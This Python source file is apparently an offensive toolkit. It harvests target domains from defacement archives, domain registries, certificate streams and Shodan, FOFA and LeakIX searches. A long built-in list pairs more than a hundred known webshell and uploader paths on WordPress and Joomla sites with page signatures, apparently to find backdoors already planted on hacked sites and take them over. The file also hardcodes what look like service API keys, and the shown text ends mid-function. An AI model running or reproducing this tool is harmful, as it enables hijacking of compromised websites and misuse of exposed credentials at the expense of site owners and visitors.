import os
import sys
import json
import time
import random
import urllib
import base64
import socket
import asyncio
import smtplib
import warnings
import ipaddress
from uuid import uuid4
from email.mime.text import MIMEText
from multiprocessing.dummy import Pool
from datetime import datetime, timedelta
from urllib.parse import parse_qs, urlparse
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
from re import findall as reg , finditer , IGNORECASE , search

try:
    import wget
    import boto3
    import shodan
    import console
    import aiohttp
    import certstream
    import requests
    import fontstyle
    import paramiko
    from selenium import webdriver
    from bs4 import BeautifulSoup as bs
    from user_agent import generate_user_agent
    from selenium.webdriver.common.by import By
    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from tabulate import tabulate
except:
    moduleinstaller()

requests.packages.urllib3.disable_warnings()
semaphore = asyncio.Semaphore(100) 

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
# bd = '\u001b[1m'
# res = '\u001b[0m'

chk = False

VALIDS = 0
INVALIDS = 0
VALID = 0
BAD = 0
CHECKED = 0
TOTAL = 0

now = datetime.now()
ystrdy = now.date() - timedelta(days=1)
ystrdy = ystrdy.strftime('%d-%m-20%y')
today = now.date()
todayr = today.strftime('20%y-%m-%d')
today = today.strftime('%d-%m-20%y')

# pagetype = list(x.strip() for x in open("files/pagetype",'r',errors='ignore').readlines())
# pageformat = list(x.strip() for x in open("files/pageformat",'r',errors='ignore').readlines())
# searchfunctions = list(x.strip() for x in open("files/searchfunctions",'r',errors='ignore').readlines())
# domainskeywords = list(x.strip() for x in open("files/domainskeywords",'r',errors='ignore').readlines())

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

headers2 = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

NYX = [
    {'name':'fwe.php','keywords':{'Owner/Group'}},
    {'name':'wp-content/11.php','keywords':{'Negat1ve1337.'}},
    {'name':'class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'.well-known/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'.well-known/pki-validation/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'wp-content/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'.tmb/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'images/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'wp-content/uploads/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'.well-known/acme-challenge/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name':'wp-includes/class.api.php','keywords':{'%PDF-0-1<form action'}},
    {'name': '/wp-content/json.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/uploads/json.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/freeyanz/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/erapress/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/plugins/doyanz/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/panama/json.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/moog/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/uploads/2023/11/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/uploads/2023/12/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/blogai/issue.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/agwin/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/themes/quext/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name': '/wp-content/plugins/app-calendar/config.php', 'keywords': {'xXx Kelelawar Cyber Team xXx'}},
    {'name':'wp-content/smm.php','keywords':{'yanz'}},
    {'name':'jetpack.php','keywords':{'<title>Gecko'}},
    {'name':'ws.php','keywords':{'Owner/Group'}},
    {'name':'bala.php','keywords':{'Owner/Group'}},
    {'name':'radio.php','keywords':{'Owner/Group'}},
    {'name':'xltavrat.php','keywords':{'Owner/Group'}},
    {'name':'.wp-back.phP','keywords':{'Owner/Group'}},
    {'name':'wp-admin/fw.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-content/fw.php','keywords':{'drwxr-xr-x'}},
    {'name':'autoload_classmap.php','keywords':{'Owner/Group'}},
    {'name':'wp-includes/wp-class.php','keywords':{'Owner/Group'}},
    {'name':'wp-content/plugins/fix/up.php','keywords':{'Select image to upload:'}},
    {'name':'wp-commentin.php?pass=f0aab4595a024d626315fb786dce8282','keywords':{"Owner/Group"}},
    {'name':'wp-includes/js/tinymce/plugins/compat3x/css/index.php','keywords':{"title>Gecko"}},
    {'name':'.well-known/acme-challenge/xmrlpc.php','keywords':{"Tiny File Manager"}},
    {'name':'.well-known/pki-validation/install.php','keywords':{"Mr.Combet Webshell"}},
    {'name':'wp-config-sample.php','keywords':{'LuFix</title>'}},
    {'name':'.well-known/pki-validation/atomlib.php','keywords':{'<title>x3x3x3x_5h3ll</title>'}},
    {'name':'wp-includes/sodium_compat/src/Core32/Curve25519/Ge/index.php','keywords':{'name="postpass" type="password"','type="submit" value="gogogo"'}},
    {'name':'libraries/fof/database/iterator/xmrlpc.php?p=','keywords':{'<title>"Tiny File Manager"</title>'}},
    {'name':'wp-content/style-css.php','keywords':{'<title>dfsfkjltyerg</title>'}},
    {'name':'wp-content/data-db.php','keywords':{'WSOX ENC'}},
    {'name':'.well-known/wp-login.php','keywords':{'WSOX ENC'}},
    {'name':'components/com_newsfeeds/models/indexx.php','keywords':{'<title>.</title>'}},
    {'name':'plugins/finder/categories/about.php','keywords':{'<title>WHY MINI SHELL</title>'}},
    {'name':'updates.php','keywords':{'WSO 4.2.6</title>'}},
    {'name':'wp-includes/rest-api/about.php','keywords':{'WSOX ENC'}},
    {'name':'wp-head.php','keywords':{'WSOX ENC</title>'}},
    {'name':'thanks.php','keywords':{'WSOX ENC</title>'}},
    {'name':'wp-includes/random_compat/about.php','keywords':{'WSOX ENC</title>'}},
    {'name':'alfa-rex.php7','keywords':{'<span>Upload file:</span>'}},
    {'name':'wp-content/themes/finley/min.php','keywords':{'Yanz Webshell!'}},
    {'name':'wp-content/themes/mero-megazines/ws.php','keywords':{'WSO 5.5</title>'}},
    {'name':'wp-content/themes/welfare-charity/www.php','keywords':{'<span>Upload file:</span>'}},

    {'name':'xl2023.php','keywords':{'drwxr-xr-x'}},
    {'name':'xl2023.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-admin/xl2023.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-content/xl2023.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-includes/xl2023.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-content/themes/applica/400.php','keywords':{'-rw-r--r--','#wp_config_error#</title'}},
    {'name':'wp-includes/sitemaps/providers/about.php','keywords':{'WSOX ENC'}},

    {'name':'xleet.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'xleet-shell.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp-admin/xleet-shell.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp-content/xleet-shell.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp-includes/xleet-shell.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp-content/plugins/revslider/includes/external/page/index.php','keywords':{'method=post>Password',"type=submit name='watching'"}},

    {'name':'wso112233.php','keywords':{'<span>Upload file:</span>'}},
    {'name':'wp-admin/wso112233.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-content/wso112233.php','keywords':{'drwxr-xr-x'}},
    {'name':'wp-includes/wso112233.php','keywords':{'drwxr-xr-x'}},

    {'name':'shell20211028.php','keywords':{'<span>Upload file:</span>'}},
    {'name':'wp-admin/shell20211028.php','keywords':{'<span>Upload file:</span>'}},
    {'name':'wp-content/shell20211028.php','keywords':{'<span>Upload file:</span>'}},
    {'name':'wp-includes/shell20211028.php','keywords':{'<span>Upload file:</span>'}},

    {'name':'wp-content/themes/seotheme/db.php?u','keywords':{'#0x2525',"_upl"}},
    {'name':'wp-content/plugins/seoplugins/db.php?u','keywords':{'#0x2525',"_upl"}},
    {'name':'wp-content/themes/seotheme/mar.php','keywords':{'#0x2525',"marijuana"}},
    {'name':'wp-content/plugins/seoplugins/mar.php','keywords':{'#0x2525',"marijuana"}},

    {'name':'wp-content/plugins/wordpress-three/miin.php','keywords':{'Owner/Group'}},
    {'name':'wp-content/plugins/column/miin.php','keywords':{'Owner/Group'}},
    {'name':'wp-content/plugins/wp-daft/miin.php','keywords':{'Owner/Group'}},

    {'name':'wp-content/plugins/hellopress/wp_mna.php','keywords':{'MARIJUANA','drwxr-xr-x'}},
    {'name':'wp-content/plugins/hellopress/wp_filemanager.php','keywords':{'fm_usr','fm_pwd'}},

    {'name':'lufix.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp-content/plugins/hellopress/0xlufix2023.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp-confiig.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'wp_wrong_datlib.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
    {'name':'repeater.php','keywords':{'<input type="password" name="password">','<input type="submit"','method="post"'}},
    {'name':'wp-admin/css/colors/coffee/index.php','keywords':{'<input type="submit" name="submit" value="  >>">'}},
    {'name':'2index.php','keywords':{'method=post>Password',"type=password name=pass><input type=submit"}},
    {'name':'beence.php','keywords':{'method=post>Password','type=password name=pass'}},
    {'name':'wp-content/updates.php','keywords':{'<input type="password" name="password">'}},
    {'name':'loger.php','keywords':{'method=post>Password',"type=submit name='watching'"}},

    {'name':'up.php','keywords':{'drwxr-xr-x'}},
    {'name':'vendor/htmlawed/htmlawed/gel4y.php','keywords':{'<title>Gel4y Mini Shell</title>'}},
    {'name':'css.php','keywords':{'drwxr-xr-x'}},
    {'name':'data.php','keywords':{'drwxr-xr-x'}},
    {'name':'mini.php','keywords':{'drwxr-xr-x'}},
    {'name':'shell.php','keywords':{'drwxr-xr-x'}},
    {'name':'edit.php','keywords':{'Green Shell'}},
    {'name':'wp-blog.php','keywords':{'drwxr-xr-x'}},
    {'name':'gank.php.PhP','keywords':{'drwxr-xr-x'}},
    {'name':'mt/pekok.php','keywords':{'Kirigaya Kirito'}},
    {'name':'ups.php','keywords':{'Vuln!! patch it Now!'}},
    {'name':'wikindex.php','keywords':{'title>Mini Shell'}},
    {'name':'wp.php?Chitoge','keywords':{'Chitoge kirisaki <3'}},
    {'name':'wp-content/plugins/TOPXOH/wDR.php','keywords':{'FilesMan'}},
    {'name':'wp-content/themes/sketch/404.php','keywords':{'drwxr-xr-x'}},
    {'name':'doc.php','keywords':{'Upload File','Current Path','Your IP'}},
    {'name':'sym403.php','keywords':{'title>Symlink Get Config 403','_upl'}},
    {'name':'style.php','keywords':{'enctype="multipart/form-data"><input type="file"'}},
    {'name':'wp-content/plugins/w0rdpr3ssnew/about.php','keywords':{'Faizzz-Chin ShellXploit'}},
    {'name':'wp-conflg.php','keywords':{'Current Path','Upload File','Ghazascanner File Manager'}},
    {'name':'database.php','keywords':{'DeathShop Uploader',"enctype='multipart/form-data'","type='file'"}},
    {'name':'wp-content/plugins/xwp/up.php','keywords':{'enctype="multipart/form-data"><input type="file"'}},
    {'name':'wp-content/plugins/anttt/simple.php','keywords':{'input type="file" id="inputfile" name="inputfile"'}},
    {'name':'wp-content/plugins/instabuilder2/cache/plugins/moon.php','keywords':{'<title>Gel4y Mini Shell</title>'}},
    {'name':'wp-content/plugins/instabuilder2/cache/up.php','keywords':{"input type='submit' name='upload' value='upload'"}},
    {'name':'wp-includes/sodium_compat/src/Core32/Curve25519/Ge/index.php','keywords':{"File Manager",'title>Tiny File Manager'}},
    {'name':'wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647','keywords':{'UPload PHP',"enctype='multipart/form-data'","type='file'"}},
    {'name':'wp-content/plugins/wordpresss3cll/up.php','keywords':{'enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<'}},
    {'name':'wp-content/plugins/wpyii2/wpyii2.php','keywords':{"<form class='gegel2' method=post><input type=password name=pw><input type=submit value='>>'></form>"}},
    {'name':'wp-content/plugins/wpputty/wpputty.php','keywords':{"<form class='gegel2' method=post><input type=password name=pw><input type=submit value='>>'></form>"}},
    {'name':'wp-content/plugins/dos2unix/dos2unix.php','keywords':{"<form class='gegel2' method=post><input type=password name=pw><input type=submit value='>>'></form>"}}
]

def logo():
    msg = """{}       ⣰⡆                      ⠐⣆       \     ⣴⠁⡇    {}@Nyx_FallagaTn{}    ⢀⠃⢣\     ⢻ ⠸⡀                     ⡜ ⢸⠇         \    ⠘⡄⢆⠑⡄     ⢀⣀⣀⣠⣄⣀⣀⡀     ⢀⠜⢠⢀⡆          \     ⠘⣜⣦⠈⢢⡀⣀⣴⣾⣿⡛⠛⠛⠛⠛⠛⡿⣿⣦⣄ ⡠⠋⣰⢧⠎           \      ⠘⣿⣧⢀⠉⢻⡟⠁⠙⠃    ⠈⠋ ⠹⡟⠉⢠⢰⣿⠏           \       ⠘⣿⡎⢆⣸⡄          ⠠⣿⣠⢣⣿⠏             \       ⡖⠻⣿⠼⢽            ⢹⠹⣾⠟⢳⡄           \       ⡟⡇⢨ ⢸⡀           ⡎ ⣇⢠⢿⠇           \       ⢹⠃⢻⡤⠚    {}⣀  ⢀{}    ⠙⠢⡼ ⢻   \       ⠸⡓⡄{}⢹⠦⠤⠤⠤⢾⣇  ⢠⡷⠦⠤⠤⠴⢺{}⢁⠔⡟  \       ⢠⠁⣷{}⠈⠓⠤⠤⠤⣞⡻  ⢸⣱⣤⠤⠤⠔⠁{}⣸⡆⣇   \       ⠘⢲⠋⢦⣀⣠⢴⠶ {}⠁  ⠈⠁{}⠴⣶⣄⣀⡴⠋⣷⠋   \        ⣿⡀  ⢀⡘⠶⣄⡀   ⣠⡴⠞⣶ ⢀ ⣼              \        ⠈⠻⣌⢢⢸⣷⣸⡈⠳⠦⠤⠞⠁⣷⣼⡏⣰⢃⡾⠋              \          ⠙⢿⣿⣿⡇⢻⡶⣦⣤⡴⡾⢸⣿⣿⣷⠏               \            ⢿⡟⡿⡄⣳⣤⣤⣴⢁⣾⠏⡿⠁                 \            ⠈⣷⠘⠒⠚⠉⠉⠑⠒⠊⣸⠇                 \             ⠈⠳⠶⠔⠒⠒⠲⠴⠞⠋{}              \ """.format(fg,fr,fg,fr,fg,fr,fg,fr,fg,fr,fg,fw)
    lines = [line.center(os.get_terminal_size().columns, " ") for line in msg.split('\\')]
    for line in lines:
        print(fontstyle.apply(line, 'bold/GREEN'))
    print()

def root_domain(url):
    if 'http://' not in str(url) and 'https://' not in str(url):
        url = 'http://' + str(url)
    return str(urlparse(url).netloc).replace('www.','')

def SV(site,file):
    open(file,'a')
    site = ref_rev(root_domain(site))
    check = list(x.strip() for x in open(file, 'r',errors='ignore').readlines())
    found = 0
    for sss in check:
        if str(site) == str(sss):
            found +=1
            break
    if found == 0:
        print('[{}#{}] {}'.format(fg,fw,site))
        open(file,'a',errors='ignore').write(site + '\n')
    else:
        print('[{}#{}] {}'.format(fr,fw,site))
    return

def ref_rev(i):
    rep = ['www.','cpanel.','ns1.','ns2.','ns3.','ns4.','cpcontacts.','cpcalendars.','webdisk.','hostmaster.','autodiscover.','webmail.','smtp.','whm.','mail.','facebook.','youtube.','whatsapp.']
    if '<' not in str(i) and '>' not in str(i):
        for x in rep:
            i = str(i).replace(x,'')
    return i 

def spliteven(list_a, chunk_size):
    for i in range(0, len(list_a), chunk_size):
        yield list_a[i:i + chunk_size]

def zoneh():
    driver = webdriver.Firefox()
    driver.get("https://zone-h.org/")
    ZHE = driver.get_cookie("ZHE")['value']
    PHPSESSID = driver.get_cookie("PHPSESSID")['value']

    cookies = {'ZHE': ZHE, 'PHPSESSID': PHPSESSID}
    
    for param in ['archive', 'archive/published=0']:
        page = 0
        while True:
            page += 1
            url = f'https://zone-h.org/{param}/page={page}'
            r = requests.get(url, headers=headers, cookies=cookies).text
            r = r.replace('\n', '').replace(' ', '').replace('\t', '')
            if 'inputtype="text"name="captcha"value=""' in r:
                driver.get(url)
                page -=1
                print(f'CAPTCHA detected! Please open http://www.zone-h.com/{param} and solve the CAPTCHA.')
                input('Press Enter to Continue after solving the CAPTCHA...')
                continue
            else:
                sites = reg('"></td><td></td><td>(.*?)</td><td>', r)
                sites = [s for s in sites if '...' not in s and '....' not in s and '..' not in s]
                sites = [*set(sites)]
                if str(sites) == '[]':
                    break
                else:
                    for site in sites:
                        SV(site, 'sites.txt')

def cleaner_site(site):
    if '/' in str(site):site = str(site).split('/',1);site = str(site[0])
    site = str(site).replace('www.','')
    return site

def zone_xsec():
    page = 1
    while True:
        url = 'https://zone-xsec.com/archive/page={}'.format(page)
        r = requests.get(url , headers=headers).text
        r = bs(r , 'html.parser')
        body = r.find('tbody')
        body = str(body).replace('\n','')
        sites = reg('/></td><td></td><td>(.*?)</td><td><a href',str(body))
        if sites == []:
            break
        sites = [cleaner_site(sites) for sites in sites]
        sites = [sites for sites in sites if '..' not in str(sites) and '...' not in str(sites) and '....' not in str(sites)]
        sites = [*set(sites)]
        for site in sites:
            site = root_domain(site)
            SV(site,'sites.txt')
        page +=1
    
    return

def haxor():
    page = 1
    while True:
        url = 'https://haxor.id/archive?page={}'.format(page)
        r = requests.get(url , headers=headers).text
        if 'only 50 page newest are allowed to be shown to public' in str(r):
            break
        r = bs(r,'html.parser')
        sites = r.find_all('tbody')
        for i in sites:
            if '_blank' in str(i):
                sites = str(i)
        qsdhgaç_ = reg('href="(.*?)"',str(sites))
        qsdhgaç_ = [qsdhgaç_ for qsdhgaç_ in qsdhgaç_ if str(qsdhgaç_).startswith('http')]
        qsdhgaç_ = [str(qsdhgaç_).replace('http://','').replace('https://','').split('/')[0].replace('www.','') for qsdhgaç_ in qsdhgaç_]
        print('\n' + fontstyle.apply('[{}•{}] '.format(fg,fw) + url,'bold') + '\n')
        for i in qsdhgaç_:
            SV(i,'sites.txt')
        page += 1

def Hypestat():
    page = 0
    while True:
        page += 1
        url = 'https://hypestat.com/recently-updated/{}'.format(page)
        r = requests.get(url , headers=headers).text
        dates = reg('<dd>(.*?)<br>',str(r))
        r = bs(r,'html.parser')
        links = r.find_all('a', href=True)
        links = [str(link).split('https://hypestat.com/info/')[1].split('">')[0] for link in links if 'https://hypestat.com/info/' in str(link)]
        links = [*set(links)]
        for i in range(len(links)):
            try:
                if 'day' in str(dates[i]).lower():
                    break
            except:
                continue
            SV(links[i],'sites.txt')

def grabbercubdomain(yesterday,date):
    page = 1
    while True:
        url ='https://www.cubdomain.com/domains-registered-by-date/{}/{}'.format(str(date),str(page))
        req = requests.get(url,headers=headers).text
        req = bs(req , 'html.parser')
        req = req.find_all('main')
        sites = reg('href="https://www.cubdomain.com/site/(.*?)"',str(req))
        if str(page) == '1' and str(sites) =='[]':
            print('\n{}[{} # {}] List is {}Not Available{} for {}{}{}'.format(fw,fy,fw,fr,fw,fg,date,fw))
            new = yesterday - timedelta(days=1)
            inputDate = new.strftime('20%y-%m-%d')
            grabbercubdomain(new,inputDate)
            break
        sites = [*set(sites)]
        for i in sites:
            SV(i,'sites.txt')
        if str(sites) == '[]':break
        page +=1

def cubdomainmain():
    yesterday = now.date() - timedelta(days=1)
    inputDate = yesterday.strftime('%d-%m-20%y')
    day, month, year = inputDate.split('-')
    isValidDate = True
    try:
        datetime(int(year), int(month), int(day))
    except ValueError:
        isValidDate = False
    if(isValidDate):
        date = '{}-{}-{}'.format(year,month,day)
        grabbercubdomain(yesterday,date)
    else:
        cubdomainmain()

def rev_bitverzo(ip):
    url = 'http://glossaryscript.com/ip/{}'.format(ip)
    req = requests.get(url , headers=headers).text
    req = bs(req,'html.parser')
    req = req.find_all('div',{'class':'col-md-2'})
    req = [reg('">(.*?)</a>',str(x))[0].split('">')[1] for x in req ]
    req = [str(x).replace('www.','') for x in req]
    req = [*set(req)]
    if str(req) != '[]':
        print('{}[ {}+{} ] {} [ {}{}{} ]'.format(fw,fg,fw,ip,fg,len(req),fw))
        for i in req:
            open('sites.txt','a',errors='ignore').write(i + '\n')
        open('ips.txt','a',errors='ignore').write(ip + '\n')

def bitverzo():
    url = 'http://glossaryscript.com/recent_ip?p=0'
    req = requests.get(url , headers=headers).text
    ips = reg('http://glossaryscript.com/ip/(.*?)"',str(req))
    ips = [*set(ips)]
    try:
        Pool(len(ips)).map(rev_bitverzo,ips)
    except:pass
    print('{}[{}INFO{}] Removing Duplicates from files..'.format(fw,fg,fw))
    f = open('sites.txt','r',errors='ignore').read().splitlines()
    print('{}[{}INFO{}] Original Lines count : {}'.format(fw,fg,fw,len(f)))
    f = [f for f in f if '.' in str(f) and not str(f).startswith('.')]
    f = [*set(f)]
    print('{}[{}INFO{}] New Lines count : {}'.format(fw,fg,fw,len(f)))
    os.remove('sites.txt')
    print('{}[{}INFO{}] Saving to sites.txt'.format(fw,fg,fw))
    for x in f:
        open('sites.txt','a',errors='ignore').write( x + '\n')

def onetld(domains1,domains2,tld):
    p = 0
    urlx1 = 'https://www.topsitessearch.com/domains/'
    urlx2 = 'https://www.greensiteinfo.com/domains/'
    while True:
        if str(tld) in domains1:
            urlx = urlx1 + str(tld) + '/' + str(p) + '/'
            req = requests.get(urlx).text
            list = reg('<td><strong>(.*?)</strong></td>',req)
            ip = [list for list in list if list != '' and '<img' not in str(list)]
            xs = [list for list in list if list != '']
            for z in range(0,10) : 
                if 'href' in str(xs[z]):
                    beta = str(xs[z]).split('<a href = https://www.topsitessearch.com/')[1].split('/><img')[0]
                    try:
                        SV(ip[z],'ips.txt')
                    except:pass
                    try:
                        SV(beta,'sites.txt')
                    except:pass
        if str(tld) in domains2:
            urlx = urlx2 + str(tld) + '/' + str(p) + '/'
            req = requests.get(urlx).text
            list = reg('<td><strong>(.*?)</strong></td>',req)
            ip = [list for list in list if list != '' and '<img' not in str(list)]
            xs = [list for list in list if list != '']
            for z in range(0,10) : 
                if 'href' in str(xs[z]):
                    beta = str(xs[z]).split('<a href = https://www.greensiteinfo.com/search/')[1].split('/ ><img')[0]
                    try:
                        SV(ip[z],'ips.txt')
                    except:pass
                    try:
                        SV(beta,'sites.txt')
                    except:pass
        p+=1

def masstld(domains1,domains2,maindomains):
    p = 0
    urlx1 = 'https://www.topsitessearch.com/domains/'
    urlx2 = 'https://www.greensiteinfo.com/domains/'
    while True:
        for x in maindomains:
            if str(x) in domains1:
                urlx = urlx1 + str(x) + '/' + str(p) + '/'
                req = requests.get(urlx).text
                list = reg('<td><strong>(.*?)</strong></td>',req)
                ip = [list for list in list if list != '' and '<img' not in str(list)]
                xs = [list for list in list if list != '']
                for z in range(0,10) : 
                    if 'href' in str(xs[z]):
                        beta = str(xs[z]).split('<a href = https://www.topsitessearch.com/')[1].split('/><img')[0]
                        try:
                            SV(ip[z],'ips.txt')
                        except:pass
                        try:
                            SV(beta,'sites.txt')
                        except:pass
            if str(x) in domains2:
                urlx = urlx2 + str(x) + '/' + str(p) + '/'
                req = requests.get(urlx).text
                list = reg('<td><strong>(.*?)</strong></td>',req)
                ip = [list for list in list if list != '' and '<img' not in str(list)]
                xs = [list for list in list if list != '']
                for z in range(0,10) : 
                    if 'href' in str(xs[z]):
                        beta = str(xs[z]).split('<a href = https://www.greensiteinfo.com/search/')[1].split('/ ><img')[0]
                        try:
                            SV(ip[z],'ips.txt')
                        except:pass
                        try:
                            SV(beta,'sites.txt')
                        except:pass
        p+=1

def tldgrabber():
    maindomains = []
    url1 = 'https://www.topsitessearch.com/domains/'
    req = requests.get(url1).text
    domains1 = reg('<a class="btn btn-secondary" href="https://www.topsitessearch.com/domains/(.*?)/">',req)
    for x in domains1: 
        if str(x) not in maindomains:
            maindomains.append(x)
    url2 = 'https://www.greensiteinfo.com/domain_extensions/'
    req = requests.get(url2).text
    domains2 = reg('<a href = "https://www.greensiteinfo.com/domains/(.*?)/',req)
    for x in domains2: 
        if str(x) not in maindomains:
            maindomains.append(x)
    
    maindomains.sort()
    maindomains = list(spliteven(maindomains, 10))
    print(tabulate(maindomains))
    op = input('\n\t{}[{} 1 {}]{} Grab One Specific TLD \n\t{}[{} 2 {}]{} Grab all TLD\n\n = > '.format(fr,fg,fr,fw,fr,fg,fr,fw))
    if op =='1':
        while True:
            tld = input('{}[{} #{} ] Choose a {}tld{} from the list above!\n = > '.format(fw,fr,fw,fg,fw))
            if str(tld) in str(maindomains):
                break
        onetld(domains1,domains2,tld)
    elif op =='2':
        masstld(domains1,domains2,maindomains)

domains_cert = []

def print_callback(message, context):
    if message['message_type'] == "heartbeat":
        return
    if message['message_type'] == "certificate_update":
        all_domains = message['data']['leaf_cert']['all_domains']
        if len(all_domains) == 0:
            domain = "NULL"
        else:
            domain = all_domains[0]
        if str(domain).startswith('*.'):
            domain = str(domain).replace('*.','')
        if str(domain).startswith('www.'):
            domain = str(domain).replace('www.','')
        if domain not in domains_cert:
            domains_cert.append(domain)
            SV(domain,'sites.txt')

def certstream_main():
    certstream.listen_for_events(print_callback, url='wss://certstream.calidog.io/')

# IPS GRABBER ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def fofa_search(query):
    query_bytes = str(query).encode('utf-8')
    encoded_query = base64.b64encode(query_bytes)
    url_encoded_query = urllib.parse.quote(encoded_query.decode('utf-8'))
    url = 'https://en.fofa.info/result?qbase64={}'.format(url_encoded_query)
    rez = []
    for i in range(100):
        try:
            req = requests.get(url , headers=headers).text
            req = bs(req , 'html.parser')
            req = req.find_all('span',{'class':'hsxa-host'})
            results = [reg('href="(.*?)"',str(site))[0] for site in req]
            for res in results :
                if res not in rez:
                    rez.append(res)
                    print('[{}#{}] {}'.format(fg,fw,res))
                    open('fofa.txt','a',errors='ignore').write(res + '\n')
        except:
            continue

def fofa_main():
    kws = list(x.strip() for x in open(input(fontstyle.apply('[{}#{}] Keywords File : '.format(fg,fw),'bold')),'r',errors='ignore').readlines())
    kws = [*set(kws)]
    fofa_search(kws)

def leakix_grabber(kws):
    Agent1 = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
        'Accept': 'application/json',
        'api-key': 'kpYJftDMXONpCa1Xo3E56p5xICHTLCK7ALHytcVxPapw8PeX'
        }
    sess = requests.session()
    ALLIPS = []
    for kw in kws :
        for page in range(1,50):
            url = 'https://leakix.net/search?page={}&scope=service&q={}'.format(str(page),str(kw))
            try:
                KONTOL = sess.get(url, timeout=10,headers=Agent1).json()
                if 'The requested site is currently unavailable' in str(KONTOL):
                    break
            except:
                break
            for MEKI in KONTOL:
                try:
                    ip = str(MEKI['ip'])
                    if ip not in ALLIPS and ':' not in str(ip):
                        ALLIPS.append(ip)
                        open('IPS.txt','a',errors='ignore').write(ip + '\n')
                except:
                    page -= 1
                    time.sleep(1)
            print(fontstyle.apply(f'{fw}[ {fg}+{fw} ] [ {fr}KEYWORD{fw} : {fg}{str(kw)}{fw} ] [ {fr}PAGE{fw} : {fg}{str(page)}{fw} ] {fg}IPS{fw} : {len(ALLIPS)}\r','bold') , end='\r')

def leakix_main():
    kws = list(x.strip() for x in open(input(fontstyle.apply('[{}#{}] Keywords File : '.format(fg,fw),'bold')),'r',errors='ignore').readlines())
    kws = [*set(kws)]
    leakix_grabber(kws)

def shodan_string_search(shodan_search_object, shodan_search_string, page_to_return):
    global ALL_S_IPS
    results = shodan_search_object.search(shodan_search_string, page=page_to_return)
    result_count = 100 * (int(page_to_return) - 1)
    for result in results['matches']:
        result_count += 1
        ip = str(result['ip_str'])
        if ip not in ALL_S_IPS:
            ALL_S_IPS.append(ip)
            open('shodan.txt','a',errors='ignore').write(result['ip_str'] + '\n')
        print(fontstyle.apply(f'{fw}[ {fg}+{fw} ] [ {fr}KEYWORD{fw} : {fg}{str(shodan_search_string)}{fw} ] {fg}IPS{fw} : {len(ALL_S_IPS)}\r','bold') , end='\r')
    return

def shodan_main():
    global ALL_S_IPS
    ALL_S_IPS = []
    kws = list(x.strip() for x in open(input(fontstyle.apply('[{}#{}] Keywords File : '.format(fg,fw),'bold')),'r',errors='ignore').readlines())
    kws = [*set(kws)]
    open('shodan.txt','a')
    api_key = "pHHlgpFt8Ka3Stb5UlTxcaEwciOeF2QM"
    shodan_object = shodan.Shodan(api_key)
    for kw in kws:
        search_page_number = 1
        shodan_string_search(shodan_object,str(kw), search_page_number)

# REVERSERS +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def rev_webscan(host):
    open('Reversed.txt','a')
    lista = []
    try:
        url = 'https://api.webscan.cc/?action=query&ip={}'.format(host)
